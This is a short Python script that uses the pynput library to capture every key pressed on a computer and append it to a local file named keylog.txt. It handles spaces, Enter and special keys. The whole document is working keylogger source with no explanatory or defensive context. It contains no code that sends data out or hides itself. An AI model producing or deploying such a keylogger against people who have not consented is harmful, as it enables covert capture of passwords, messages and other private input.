from pynput import keyboard

#Log file path
log_file = "keylog.txt"

#Function to write keys to file
def write_to_file(key):
    with open(log_file, "a") as f:
        try:
            f.write(key.char)
        except AttributeError:
            if key == key.space:
                f.write(" ")
            elif key == key.enter:
                f.write("\n")
            else:
                f.write(f"[{str(key)}] ")

#Listener function
def on_press(key):
    write_to_file(key)

#Start listening
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
